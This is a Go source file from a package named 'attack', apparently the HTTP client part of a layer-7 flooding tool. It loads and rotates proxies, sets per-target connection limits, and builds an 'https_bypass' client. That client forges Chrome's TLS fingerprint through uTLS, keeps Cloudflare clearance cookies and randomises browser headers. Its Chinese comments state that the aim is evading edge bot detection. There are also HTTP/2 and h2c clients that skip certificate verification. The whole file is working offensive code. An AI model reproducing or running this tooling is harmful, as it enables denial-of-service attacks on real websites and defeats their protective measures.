package attack

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

var (
	proxies            []string
	proxyLock          sync.RWMutex
	sharedHTTPClient   *http.Client
	sharedHTTPClientMu sync.Once
)

// parseProxyLine 解析单行代理配置；非法行返回空串并告警。
// 支持的格式：host:port、http://host:port、http(s)://user:pass@host:port、
// socks5://user:pass@host:port。
// 修复：非标准格式（如 ip:port:user:pass）此前会被静默当作直连/坏 host，
// 代理轮换失效且无任何日志——现在加载时即告警并跳过。
func parseProxyLine(line string) string {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return ""
	}
	if !strings.Contains(line, "://") {
		line = "http://" + line
	}
	u, err := url.Parse(line)
	if err != nil || u.Host == "" {
		log.Printf("[proxy] skipping invalid proxy line: %q", line)
		return ""
	}
	if _, _, err := net.SplitHostPort(u.Host); err != nil {
		log.Printf("[proxy] skipping invalid proxy host (missing port?): %q", line)
		return ""
	}
	return line
}

func LoadProxies(filename string) int {
	file, err := os.Open(filename)
	if err != nil {
		return 0
	}
	defer file.Close()

	var loaded []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if line := parseProxyLine(scanner.Text()); line != "" {
			loaded = append(loaded, line)
		}
	}

	proxyLock.Lock()
	if len(loaded) > 0 {
		proxies = loaded
	}
	proxyLock.Unlock()

	return len(loaded)
}

func LoadProxiesFromData(data []byte) int {
	scanner := bufio.NewScanner(bytes.NewReader(data))
	var loaded []string
	for scanner.Scan() {
		if line := parseProxyLine(scanner.Text()); line != "" {
			loaded = append(loaded, line)
		}
	}
	proxyLock.Lock()
	if len(loaded) > 0 {
		proxies = loaded
	}
	proxyLock.Unlock()
	return len(loaded)
}

func CountProxies() int {
	proxyLock.RLock()
	defer proxyLock.RUnlock()
	return len(proxies)
}

func newHTTPClient() *http.Client {
	sharedHTTPClientMu.Do(func() {
		sharedHTTPClient = &http.Client{
			Timeout: 3 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 100,
				// 单目标连接上限：目标慢时防本机 fd/goroutine 堆积
				MaxConnsPerHost: 128,
				IdleConnTimeout: 5 * time.Second,
			},
		}
	})
	return sharedHTTPClient
}

// ============================================================
// https_bypass 专用：uTLS Chrome 指纹 + Cookie 会话保持
// （CF 等边缘的机器人检测主要看 JA3/JA4 TLS 指纹与 cookie 连续性；
// Go 原生 TLS ClientHello 与真实浏览器差异巨大，几乎必被 challenge。
// uTLS 逐字节模拟 Chrome ClientHello，配合响应 Set-Cookie 积累
// （__cf_bm / cf_clearance 等）与强制 HTTP/1.1，被识别的概率大幅下降。
// 纯 Go 实现，无浏览器进程，资源开销可忽略。）
// ============================================================

// utlsDialContext 用 uTLS 建立带 Chrome 指纹的 TLS 连接。
// ALPN 仅声明 http/1.1：Chrome 指纹声明 h2+http/1.1 但实际走 h1 会被
// 边缘按 h2 协议栈解析导致连接错乱；JA3 不含 ALPN 内容，改 h1 不影响指纹。
func utlsDialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	d := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := d.DialContext(ctx, network, addr)
	if err != nil {
		return nil, err
	}
	host := addr
	if h, _, err := net.SplitHostPort(addr); err == nil {
		host = h
	}
	// 取 Chrome 最新指纹 spec，把 ALPN 扩展内容改为仅 http/1.1
	// （扩展类型/位置不变 → JA3 指纹与真实 Chrome 完全一致）
	spec, err := utls.UTLSIdToSpec(utls.HelloChrome_Auto)
	if err != nil {
		conn.Close()
		return nil, err
	}
	alpnSet := false
	for _, ext := range spec.Extensions {
		if ae, ok := ext.(*utls.ALPNExtension); ok {
			ae.AlpnProtocols = []string{"http/1.1"}
			alpnSet = true
			break
		}
	}
	if !alpnSet {
		spec.Extensions = append(spec.Extensions, &utls.ALPNExtension{AlpnProtocols: []string{"http/1.1"}})
	}
	uconn := utls.UClient(conn, &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}, utls.HelloCustom)
	if err := uconn.ApplyPreset(&spec); err != nil {
		conn.Close()
		return nil, err
	}
	if err := uconn.HandshakeContext(ctx); err != nil {
		conn.Close()
		return nil, err
	}
	return uconn, nil
}

// newBypassClient 构造 https_bypass 客户端：
//   - uTLS Chrome TLS 指纹（JA3 对齐真实浏览器）
//   - CookieJar 会话保持（代理切换时随客户端整体更换）
//   - TLSNextProto 空 map 强制 HTTP/1.1（同时消除 Go h2 SETTINGS 指纹维度）
//   - proxyStr 空 = 直连；支持 http(s):// 与 socks5:// 代理
func newBypassClient(proxyStr string) *http.Client {
	jar, _ := cookiejar.New(nil)
	tr := &http.Transport{
		DialTLSContext: utlsDialContext,
		// 空 map = 禁用所有 h2 升级（含 ALPN 协商后的 h2）
		TLSNextProto:      map[string]func(authority string, c *tls.Conn) http.RoundTripper{},
		MaxIdleConns:      100,
		MaxIdleConnsPerHost: 10,
		IdleConnTimeout:   30 * time.Second,
	}
	if proxyStr != "" {
		if u, err := url.Parse(proxyStr); err == nil {
			switch u.Scheme {
			case "http", "https":
				tr.Proxy = http.ProxyURL(u)
			case "socks5":
				var auth *proxy.Auth
				if u.User != nil {
					auth = &proxy.Auth{User: u.User.Username(), Password: func() string { p, _ := u.User.Password(); return p }()}
				}
				if dialer, err := proxy.SOCKS5("tcp", u.Host, auth, proxy.Direct); err == nil {
					if cd, ok := dialer.(proxy.ContextDialer); ok {
						tr.DialContext = cd.DialContext
					} else {
						tr.Dial = dialer.Dial
					}
				}
			}
		}
	}
	return &http.Client{Transport: tr, Jar: jar, Timeout: 10 * time.Second}
}

// buildBypassRequest 构造带 Chrome 完整特征头的请求（sec-ch-ua / sec-fetch-* 等）。
// 路径从随机基础路径开始（复用 buildL7Request 的路径随机化）。
func buildBypassRequest(target string, rng *FastRNG) *http.Request {
	req := buildL7Request("GET", target, nil, rng)
	// Chrome 特征头（值随机轮换，保持"不同浏览器实例"的表象）
	chromeUA := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + randomChromeVersion(rng) + " Safari/537.36"
	req.Header.Set("User-Agent", chromeUA)
	secChUA := `"Not/A)Brand";v="8", "Chromium";v="` + randomChromeVersion(rng) + `", "Google Chrome";v="` + randomChromeVersion(rng) + `"`
	req.Header.Set("Sec-Ch-Ua", secChUA)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	switch rng.Intn(3) {
	case 0:
		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	case 1:
		req.Header.Set("Sec-Ch-Ua-Platform", `"macOS"`)
	default:
		req.Header.Set("Sec-Ch-Ua-Platform", `"Linux"`)
	}
	switch rng.Intn(3) {
	case 0:
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "none")
	case 1:
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
	default:
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "cross-site")
	}
	if rng.Intn(2) == 0 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	return req
}

// randomChromeVersion 生成接近真实 Chrome 大版本号的版本串（120~140 区间）
func randomChromeVersion(rng *FastRNG) string {
	major := 120 + rng.Intn(21)
	return fmt.Sprintf("%d.0.%d.%d", major, 6000+rng.Intn(3000), 100+rng.Intn(900))
}

// newHTTP2Client HTTP/2 客户端：
//   - forceH2C=true  → 明文 h2c（http:// 目标）：单连接多路复用，无 fd 压力
//   - forceH2C=false → 标准 TLS + ALPN 协商 h2（https:// 目标，跳过证书校验）
func newHTTP2Client(forceH2C bool) *http.Client {
	if forceH2C {
		tr := &http2.Transport{
			AllowHTTP: true,
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				return (&net.Dialer{}).DialContext(ctx, network, addr)
			},
		}
		return &http.Client{Timeout: 5 * time.Second, Transport: tr}
	}
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	return &http.Client{Timeout: 5 * time.Second, Transport: tr}
}
